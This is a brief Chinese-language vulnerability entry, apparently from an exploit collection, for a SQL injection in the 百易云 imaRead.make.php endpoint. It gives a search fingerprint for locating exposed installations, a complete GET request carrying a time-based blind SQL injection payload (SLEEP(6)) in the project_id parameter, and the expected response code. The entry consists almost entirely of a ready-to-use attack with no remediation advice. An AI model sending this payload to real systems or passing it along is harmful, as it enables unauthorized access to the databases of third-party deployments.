# 百易云imaRead.make存在SQL注入漏洞

百易云imaRead.make ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /adminx/imaRead.make.php?act=make&ima_type=turnover&building_code=imaShare&fee_month=2025-05&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))xxxx) HTTP/1.1`
- **响应特征**：200